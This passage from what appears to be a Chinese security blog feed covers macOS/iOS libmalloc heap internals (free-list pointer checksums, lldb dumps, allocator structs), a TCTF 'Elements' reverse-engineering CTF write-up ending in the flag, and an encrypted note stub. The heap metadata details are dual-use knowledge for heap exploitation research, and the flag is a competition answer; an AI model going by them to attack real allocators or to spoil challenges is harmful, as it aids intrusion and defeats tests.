__PRETTY_FUNCTION__);}</code></pre><p>free的时候先将该内存缓存到<code>mag_last_free</code>，若之前<code>mag_last_free</code>为NULL，那么该内存暂时不会被free，仅仅是缓存到<code>mag_last_free</code>。反之，则会将<code>mag_last_free</code>之前的内存free。在free的时候会尝试向前向后合并。合并完成后设置其前后chunk指针等metadata后将其放入对应的free list大小之中。这里需要有注意以下几点</p><ul><li>最近free的内存会被缓存，不会立即合并</li><li>在被free的块metadata是被保护的<ul><li>前后指针按16字节大小对齐</li><li>指针前4位为checksum</li></ul></li></ul><p>关于free块checksum计算如下：</p><pre><code class="c">static MALLOC_INLINE uintptr_tfree_list_checksum_ptr(rack_t *rack, void *ptr){    uintptr_t p = (uintptr_t)ptr;    return (p &gt;&gt; NYBBLE) | ((free_list_gen_checksum(p ^ rack-&gt;cookie) &amp; (uintptr_t)0xF) &lt;&lt; ANTI_NYBBLE); // compiles to rotate instruction}</code></pre><p>指针p与cookie异或然后计算checksum后左移到最高字节或上指针p右移4位得到checksumed后的指针。</p><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>代码如下</p><pre><code class="c">#include &lt;stdio.h&gt;int main(int argc, char *argv[]) {    void *p1,*p2,*p3,*p4;    p1 = malloc(24);    p2 = malloc(24);    p3 = malloc(24);    p4 = malloc(24);    memset(p1,0xaa,24);    memset(p2,0xbb,24);    memset(p3,0xcc,24);    free(p1);    free(p3);    free(p2);    free(p4);}</code></pre><p>free(p1)，直接将p1缓存，所以内存值不变</p><pre><code class="c">(lldb) x/24gx p10x1002001f0: 0xaaaaaaaaaaaaaaaa 0xaaaaaaaaaaaaaaaa0x100200200: 0xaaaaaaaaaaaaaaaa 0x00007fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p3)，p3放入缓存，p1放入大小为32字节的freelist，p1previous指针8字节设为NULL，next指针指向设为下一个free block，紧接着后面为该block大小，2*quantum=32字节</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p2)，p2放入缓存，p3放入大小为32字节的freelist，p3previous指针8字节设为NULL，next指针指向设为下一个p1</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x3000000010020023 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x200000001002001f0x100200240: 0xcccccccccccc0002 0x00020000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>free(p4)，p2向前向后合并，合并p1，p3。指向p1，大小为6*quantum=96字节。previous指针8字节设为NULL，next指针指向设为下一个大小为3Q的block</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x50000000100200480x100200200: 0xaaaaaaaaaaaa0006 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x10000000100201080x100200240: 0xcccccccccccc0002 0x00060000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>上面可以看出previous和next指针前4位都包含checksum。与上面描述的一致。</p><h4 id="libmalloc中一些结构体"><a href="#libmalloc中一些结构体" class="headerlink" title="libmalloc中一些结构体"></a>libmalloc中一些结构体</h4><h5 id="szone-s-magazine-zone-h"><a href="#szone-s-magazine-zone-h" class="headerlink" title="szone_s // magazine_zone.h"></a>szone_s // magazine_zone.h</h5><pre><code class="c">typedef struct szone_s {      // vm_allocate()&#39;d, so page-aligned to begin with.    malloc_zone_t basic_zone; // first page will be given read-only protection    uint8_t pad[PAGE_MAX_SIZE - sizeof(malloc_zone_t)];    unsigned long cpu_id_key; // unused    // remainder of structure is R/W (contains no function pointers)    unsigned debug_flags;    void *log_address;    /* Allocation racks per allocator type. */    struct rack_s tiny_rack;    struct rack_s small_rack;    /* large objects: all the rest */    _malloc_lock_s large_szone_lock MALLOC_CACHE_ALIGN; // One customer at a time for large    unsigned num_large_objects_in_use;    unsigned num_large_entries;    large_entry_t *large_entries; // hashed by location; null entries don&#39;t count    size_t num_bytes_in_large_objects;#if CONFIG_LARGE_CACHE    int large_entry_cache_oldest;    int large_entry_cache_newest;    large_entry_t large_entry_cache[LARGE_ENTRY_CACHE_SIZE]; // &quot;death row&quot; for large malloc/free    boolean_t large_legacy_reset_mprotect;    size_t large_entry_cache_reserve_bytes;    size_t large_entry_cache_reserve_limit;    size_t large_entry_cache_bytes; // total size of death row, bytes#endif    /* flag and limits pertaining to altered malloc behavior for systems with     * large amounts of physical memory */    unsigned is_largemem;    unsigned large_threshold;    unsigned vm_copy_threshold;    /* security cookie */    uintptr_t cookie;    /* The purgeable zone constructed by create_purgeable_zone() would like to hand off tiny and small     * allocations to the default scalable zone. Record the latter as the &quot;helper&quot; zone here. */    struct szone_s *helper_zone;    boolean_t flotsam_enabled;} szone_t;</code></pre><h5 id="malloc-zone-t-malloc-h"><a href="#malloc-zone-t-malloc-h" class="headerlink" title="malloc_zone_t // malloc.h"></a>malloc_zone_t // malloc.h</h5><pre><code class="c">typedef struct _malloc_zone_t {    /* Only zone implementors should depend on the layout of this structure;    Regular callers should use the access functions below */    void    *reserved1;    /* RESERVED FOR CFAllocator DO NOT USE */    void    *reserved2;    /* RESERVED FOR CFAllocator DO NOT USE */    size_t     (* MALLOC_ZONE_FN_PTR(size))(struct _malloc_zone_t *zone, const void *ptr); /* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers */    void     *(* MALLOC_ZONE_FN_PTR(malloc))(struct _malloc_zone_t *zone, size_t size);    void     *(* MALLOC_ZONE_FN_PTR(calloc))(struct _malloc_zone_t *zone, size_t num_items, size_t size); /* same as malloc, but block returned is set to zero */    void     *(* MALLOC_ZONE_FN_PTR(valloc))(struct _malloc_zone_t *zone, size_t size); /* same as malloc, but block returned is set to zero and is guaranteed to be page aligned */    void     (* MALLOC_ZONE_FN_PTR(free))(struct _malloc_zone_t *zone, void *ptr);    void     *(* MALLOC_ZONE_FN_PTR(realloc))(struct _malloc_zone_t *zone, void *ptr, size_t size);    void     (* MALLOC_ZONE_FN_PTR(destroy))(struct _malloc_zone_t *zone); /* zone is destroyed and all memory reclaimed */g    const char    *zone_name;    /* Optional batch callbacks; these may be NULL */    unsigned    (* MALLOC_ZONE_FN_PTR(batch_malloc))(struct _malloc_zone_t *zone, size_t size, void **results, unsigned num_requested); /* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) */    void    (* MALLOC_ZONE_FN_PTR(batch_free))(struct _malloc_zone_t *zone, void **to_be_freed, unsigned num_to_be_freed); /* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process */    struct malloc_introspection_t    * MALLOC_INTROSPECT_TBL_PTR(introspect);    unsigned    version;    /* aligned memory allocation. The callback may be NULL. Present in version &gt;= 5. */    void *(* MALLOC_ZONE_FN_PTR(memalign))(struct _malloc_zone_t *zone, size_t alignment, size_t size);    /* free a pointer known to be in zone and known to have the given size. The callback may be NULL. Present in version &gt;= 6.*/    void (* MALLOC_ZONE_FN_PTR(free_definite_size))(struct _malloc_zone_t *zone, void *ptr, size_t size);    /* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version &gt;= 8. */    size_t     (* MALLOC_ZONE_FN_PTR(pressure_relief))(struct _malloc_zone_t *zone, size_t goal);    /*     * Checks whether an address might belong to the zone. May be NULL. Present in version &gt;= 10.     * False positives are allowed (e.g. the pointer was freed, or it&#39;s in zone space that has     * not yet been allocated. False negatives are not allowed.     */    boolean_t (* MALLOC_ZONE_FN_PTR(claimed_address))(struct _malloc_zone_t *zone, void *ptr);} malloc_zone_t;</code></pre><h5 id="rack-t-magazine-rack-h"><a href="#rack-t-magazine-rack-h" class="headerlink" title="rack_t // magazine_rack.h"></a>rack_t // magazine_rack.h</h5><pre><code class="c">typedef struct rack_s {    /* Regions for tiny objects */    _malloc_lock_s region_lock MALLOC_CACHE_ALIGN;    rack_type_t type;    size_t num_regions;    size_t num_regions_dealloc;    region_hash_generation_t *region_generation;    region_hash_generation_t rg[2];    region_t initial_regions[INITIAL_NUM_REGIONS];    int num_magazines;    unsigned num_magazines_mask;    int num_magazines_mask_shift;    uint32_t debug_flags;    // array of per-processor magazines    magazine_t *magazines;    uintptr_t cookie;    uintptr_t last_madvise;} rack_t;</code></pre><h5 id="magazine-t-magazine-zone-h"><a href="#magazine-t-magazine-zone-h" class="headerlink" title="magazine_t // magazine_zone.h"></a>magazine_t // magazine_zone.h</h5><pre><code class="c">typedef struct magazine_s { // vm_allocate()&#39;d, so the array of magazines is page-aligned to begin with.    // Take magazine_lock first,  Depot lock when needed for recirc, then szone-&gt;{tiny,small}_regions_lock when needed for alloc    _malloc_lock_s magazine_lock MALLOC_CACHE_ALIGN;    // Protection for the crtical section that does allocate_pages outside the magazine_lock    volatile boolean_t alloc_underway;    // One element deep &quot;death row&quot;, optimizes malloc/free/malloc for identical size.    void *mag_last_free;    msize_t mag_last_free_msize;    // msize for mag_last_free#if MALLOC_TARGET_64BIT    uint32_t _pad;#endif    region_t mag_last_free_rgn; // holds the region for mag_last_free    free_list_t mag_free_list[MAGAZINE_FREELIST_SLOTS];    uint32_t mag_bitmap[MAGAZINE_FREELIST_BITMAP_WORDS];    // the first and last free region in the last block are treated as big blocks in use that are not accounted for    size_t mag_bytes_free_at_end;    size_t mag_bytes_free_at_start;    region_t mag_last_region; // Valid iff mag_bytes_free_at_end || mag_bytes_free_at_start &gt; 0    // bean counting ...    size_t mag_num_bytes_in_objects;    size_t num_bytes_in_magazine;    unsigned mag_num_objects;    // recirculation list -- invariant: all regions owned by this magazine that meet the emptiness criteria    // are located nearer to the head of the list than any region that doesn&#39;t satisfy that criteria.    // Doubly linked list for efficient extraction.    unsigned recirculation_entries;    region_trailer_t *firstNode;    region_trailer_t *lastNode;#if MALLOC_TARGET_64BIT    uintptr_t pad[320 - 14 - MAGAZINE_FREELIST_SLOTS -            (MAGAZINE_FREELIST_BITMAP_WORDS + 1) / 2];#else    uintptr_t pad[320 - 16 - MAGAZINE_FREELIST_SLOTS -            MAGAZINE_FREELIST_BITMAP_WORDS];#endif} magazine_t;</code></pre><h5 id="tiny-region-t-magazine-zone-h"><a href="#tiny-region-t-magazine-zone-h" class="headerlink" title="tiny_region_t //magazine_zone.h"></a>tiny_region_t //magazine_zone.h</h5><pre><code class="c">/* * Layout of a tiny region */typedef uint32_t tiny_block_t[4]; // assert(TINY_QUANTUM == sizeof(tiny_block_t))typedef struct tiny_header_inuse_pair {    uint32_t header;    uint32_t inuse;} tiny_header_inuse_pair_t;typedef struct region_trailer {    struct region_trailer *prev;    struct region_trailer *next;    boolean_t recirc_suitable;    volatile int pinned_to_depot;    unsigned bytes_used;    mag_index_t mag_index;} region_trailer_t;#define NUM_TINY_BLOCKS 64520typedef struct tiny_region {    tiny_block_t blocks[NUM_TINY_BLOCKS];    region_trailer_t trailer;    // The interleaved bit arrays comprising the header and inuse bitfields.    // The unused bits of each component in the last pair will be initialized to sentinel values.    tiny_header_inuse_pair_t pairs[CEIL_NUM_TINY_BLOCKS_WORDS];    uint8_t pad[TINY_REGION_SIZE - (NUM_TINY_BLOCKS * sizeof(tiny_block_t)) - TINY_METADATA_SIZE];} * tiny_region_t;</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><p><a href="http://phrack.org/issues/63/5.html" target="_blank" rel="external">http://phrack.org/issues/63/5.html</a></p></li><li><p><a href="https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf" target="_blank" rel="external">https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf</a></p></li><li><p><a href="https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf" target="_blank" rel="external">https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf</a></p></li><li><p><a href="https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html" target="_blank" rel="external">https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html</a></p></li><li><p>&lt;&lt;<a href="https://repo.zenk-security.com/Magazine%20E-book/The%20Mac%20Hacker&#39;s%20Handbook.pdf" target="_blank" rel="external">the Mac Hacker’s Handbook</a>&gt;&gt; 第8章Exploiting Heap Overflows</p></li><li><p><a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">https://opensource.apple.com/source/libmalloc/</a> 源代码</p></li><li><p><a href="http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf" target="_blank" rel="external">http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;源码解读macOS-iOS-Heap&quot;&gt;&lt;a href=&quot;#源码解读macOS-iOS-Heap&quot; class=&quot;headerlink&quot; title=&quot;源码解读macOS/iOS Heap&quot;&gt;&lt;/a&gt;源码解读macOS/iOS Heap&lt;/h3&gt;&lt;blockquo
      
    
    </summary>
    
      <category term="OS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/OS/"/>
    
    
      <category term="heap" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>TCTF-Elements</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/</id>
    <published>2019-03-27T07:13:30.000Z</published>
    <updated>2019-03-28T07:06:17.336Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TCTF-Elements"><a href="#TCTF-Elements" class="headerlink" title="TCTF-Elements"></a>TCTF-Elements</h4><blockquote><p>这道题其实是一个数学问题，当时没有做出来，解题过程中走了很多弯路，踩了很多坑，不过也补了很多知识。</p></blockquote><h4 id="Elements"><a href="#Elements" class="headerlink" title="Elements"></a>Elements</h4><p>下面是main函数伪代码</p><pre><code class="c">signed __int64 __fastcall main(__int64 a1, char **a2, char **a3){  char v3; // bl  const __int32_t **v4; // rax  char *v5; // rcx  size_t v6; // rcx  signed __int64 result; // rax  char *v8; // r12  signed __int64 v9; // r14  char v10; // bl  signed __int64 v11; // rax  const unsigned __int16 *v12; // rcx  signed __int64 v13; // rdx  __int64 v14; // rsi  unsigned __int16 v15; // bx  signed __int64 v16; // rsi  __m128i v17; // xmm0  char *v18; // rax  double v19; // xmm2_8  double v20; // xmm0_8  double v21; // xmm2_8  double v22; // xmm3_8  double v23; // [rsp+20h] [rbp-148h]  double v24; // [rsp+28h] [rbp-140h]  double v25; // [rsp+30h] [rbp-138h]  char s[8]; // [rsp+40h] [rbp-128h]  char v27; // [rsp+6Bh] [rbp-FDh]  fgets(s, 256, stdin);  v3 = s[0];  if ( s[0] )  {    v4 = __ctype_tolower_loc();    v5 = &amp;s[1];    do    {      *(v5 - 1) = (*v4)[v3];      v3 = *v5++;    }    while ( v3 );  }  v6 = strlen(s);  result = 0LL;  if ( v6 &gt;= 0x2C &amp;&amp; (*(_QWORD *)s &amp; 0xFFFFFFFFFFLL) == 530015415398LL &amp;&amp; v27 == 125 )  {    v27 = 0;    v8 = strtok(&amp;s[5], &quot;-&quot;);    v9 = 0LL;    if ( v8 )    {      while ( strlen(v8) == 12 )      {        v10 = *v8;        v11 = 0LL;        if ( *v8 )        {          v12 = *__ctype_b_loc();          v13 = 1LL;          v11 = 0LL;          do          {            v14 = v10;            v15 = v12[v10];            if ( (char)v14 &lt;= 102 &amp;&amp; v15 &amp; 0x400 )            {              v16 = v14 - 87;            }            else            {              if ( !(v15 &amp; 0x800) )                goto LABEL_31;              v16 = v14 - 48;            }            v11 = v16 | 16 * v11;            if ( v13 &gt; 11 )              break;            v10 = v8[v13++];          }          while ( v10 );        }        if ( !v9 &amp;&amp; v11 != 62791383142154LL )          break;        v17 = (__m128i)_mm_sub_pd(                         (__m128d)_mm_unpacklo_epi32((__m128i)(unsigned __int64)v11, (__m128i)xmmword_400BD0),                         (__m128d)xmmword_400BE0);        *(&amp;v23 + v9++) = COERCE_DOUBLE(_mm_shuffle_epi32(v17, 78)) + *(double *)v17.m128i_i64;        v18 = strtok(0LL, &quot;-&quot;);        v8 = v18;        if ( v9 &gt; 2 || !v18 )        {          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }          return 0LL;        }      }    }LABEL_31:    result = 0xFFFFFFFFLL;  }  return result;}</code></pre><p>这个题整个逻辑很清晰，前面一部分对输入的字符串做了一些格式和字符数量判断。</p><p>分析可得到需要输入以下格式<code>flag{xxxxxxxxxxxx-xxxxxxxxxxxx-xxxxxxxxxxxx}</code></p><p>这里通过<code>-</code>分割成三个部分，其中第一部分是已知的<code>391bc2164f0a</code>，后面就是程序验证逻辑</p><pre><code class="c">          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }</code></pre><p>当时一看其实就知道是一个三角形相关的运算，整理可得以下表达式</p><p>$c&gt;b,b&gt;a,a+b&gt;c$</p><p>$p=\frac{\sqrt{4a^2b^2-(a^2+b^2-c^2)^2)}}{2(a+b+c)}-1.940035480806554e13$</p><p>$q=\frac{abc}{(\sqrt{4a^2b^2-(a^2+b^2-c^2)^2})}-4.777053952827391e13$</p><p>$-0.00001&lt;p&lt;0.00001,-0.00001&lt;q&lt;0.00001 $</p><p>但并没有看出来是三角形内外圆的半径公式，所以想着直接上约束求解器z3</p><pre><code class="python">from z3 import *x = Real(&#39;x&#39;)y = Real(&#39;y&#39;)z = Real(&#39;z&#39;)m = Real(&#39;m&#39;)n = Real(&#39;n&#39;)p = Real(&#39;p&#39;)q = Real(&#39;q&#39;)solver = Solver()m = x*x+y*y-z*zn = (4.0*x*x*y*y-m*m)**0.5*0.25p = 2*n/(x+y+z) + (-1.940035480806554296875E13)q = x*y*z/(4.0*n) + (-4.777053952827391e13)solver.add(z &gt; y)solver.add(y &gt; x)solver.add(x + y &gt; z)solver.add(p &gt; -100,p&lt;100)solver.add(q &gt; -100,q&lt;100)solver.add(x == 6.2791383142154e13)if solver.check() == sat:    print(solver.model())else:    print(&#39;unsolve&#39;)</code></pre><p>结果求解了很久z3解不出来，后来才知道z3不能求解该类问题。z3文档中有提及只能解决非线性多项式约束，导致花了很长时间在思考是不是脚本的问题。然后用wolframalpha去求解也没有结果（目前还不清楚原因</p><p>下来思考了很久才知道是求解三角形的内外半径，通过内外圆的性质得到如下公式</p><p>$$Rr=\frac{abc}{2(a+b+c)}$$</p><p>$$tan\frac{C}{2} = \frac{2r}{a+b-c} = \frac{sinC}{1+cosC}$$</p><p>这里$sinC,cosC,R,r,c$都是已知的</p><p>所以联立能得到$$a=7.0802074077033E13,b=9.5523798483318E13 $$</p><p>得到对应的浮点数表示4064e4798769,56e0de138176</p><pre><code class="assembly">movq    xmm0, raxpunpckldq xmm0, xmmword ptr cs:qword_400BD0subpd   xmm0, cs:xmmword_400BE0pshufd  xmm1, xmm0, 4Ehaddpd   xmm1, xmm0movlpd  [rsp+r14*8+168h+var_148], xmm1</code></pre><p>在这里需要逆向求解出rax的值，即flag后面两部分。刚开始在这里卡了一下，感觉求解不出来。后面观察到qword_400BD0和xmmword_400BE0这两个数十分特殊</p><pre><code>qword_400BD0=0x4530000043300000xmmword_400BE0=0x45300000000000004330000000000000</code></pre><p>punpckldq指令会将qword_400BD0和rax分成两部分组合，这里恰好qword_400BD0为浮点数的阶数部分，rax为尾数部分</p><p>然后再分别与4530000000000000，4330000000000000相减。特殊在于这两个数阶数和上面对应相等，尾数部分为0，倒是相减结果又变回原始值。</p><p>所以其实这里的变换等于没有变换。</p><p>所以三个边长分别等于391bc2164f0a,4064e4798769,56e0de138176</p><p>最后的flag=flag{391bc2164f0a-4064e4798769-56e0de138176}</p><h4 id="补充：浮点数表示、运算、指令"><a href="#补充：浮点数表示、运算、指令" class="headerlink" title="补充：浮点数表示、运算、指令"></a>补充：浮点数表示、运算、指令</h4><p>浮点数有单精度和双精度之分，float占4个字节，double占8个字节</p><p>在表示小数的时候采用类比科学计数法的方法，把二进制小数转换为2为底的指数表示$V=(-1)^s<em>M</em>2^E$</p><p>e等于向左或向右移动到1为止的个数</p><p>比如：12.25   对应二进制：1100.01 这里需要向右移动三位$1.10001*2^3$</p><p>下面以float表示12.25这个数，分为三部分，符号位（1位）、指数（8位）、尾数（23位）</p><p>符号位0，指数3，尾数10001(第一位默认为1不需要表示)</p><p>由于指数也有负指数，所以其实还需要一位表示符号位， IEEE规定，小于01111111的指数位为负数</p><p>其实这里可以理解为首位表示符号位，这样的话采用如下计算出float指数部分表示<code>10000000+11-1=10000010</code></p><p>最后12.15单精度浮点数表示为：<code>0 10000010 10001000000000000000000</code> </p><p>十六进制：<code>0x41440000</code> 内存中小端表示：<code>00 00 44 41</code></p><table><thead><tr><th style="text-align:center">Float/Double</th><th style="text-align:center">符号位</th><th style="text-align:center">指数</th><th style="text-align:center">尾数</th><th style="text-align:left">示例</th><th style="text-align:left">16进制</th></tr></thead><tbody><tr><td style="text-align:center">Float</td><td style="text-align:center">1位</td><td style="text-align:center">8位</td><td style="text-align:center">23位</td><td style="text-align:left">0 10000010 10001000000000000000000</td><td style="text-align:left">41440000</td></tr><tr><td style="text-align:center">Double</td><td style="text-align:center">1位</td><td style="text-align:center">11位</td><td style="text-align:center">52位</td><td style="text-align:left">0 10000000010 1000100000000000000000000000 000000000000000000000000</td><td style="text-align:left">4028800000000000</td></tr></tbody></table><p>特殊的数表示：当全指数尾数全为0时，表示最小的数，这里定义为0；当指数全为1，尾数全为0时，表示最大的数，这里定义为无穷。</p><p>在线转换<a href="http://www.binaryconvert.com/" target="_blank" rel="external">http://www.binaryconvert.com/</a> </p><p>浮点数在进行加减运算的时候需要先对阶然后尾数部分运算</p><p>浮点数指令查询<a href="https://asm.inightmare.org/opcodelst/index.php" target="_blank" rel="external">https://asm.inightmare.org/opcodelst/index.php</a></p><p>这里解释下<code>pshufd  xmm1, xmm0, 4Eh</code>指令</p><p><code>pshufd</code>可以按照指定的方式重新排列数据</p><p>这里4E二进制<code>01 00 11 10</code></p><table><thead><tr><th>寄存器</th><th>值</th></tr></thead><tbody><tr><td>xmm0</td><td>42cc8d80 00000000 41e842c9 e1400000</td></tr><tr><td>4E</td><td>01               00                 11               10</td></tr><tr><td>xmm1</td><td>41e842c9 e1400000 42cc8d80 00000000</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;TCTF-Elements&quot;&gt;&lt;a href=&quot;#TCTF-Elements&quot; class=&quot;headerlink&quot; title=&quot;TCTF-Elements&quot;&gt;&lt;/a&gt;TCTF-Elements&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;这道题其实是一个数学问题，
      
    
    </summary>
    
      <category term="ctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/ctf/"/>
    
    
      <category term="tctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/tctf/"/>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>idapython learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/</id>
    <published>2019-03-07T11:42:24.000Z</published>
    <updated>2019-04-08T11:25:34.497Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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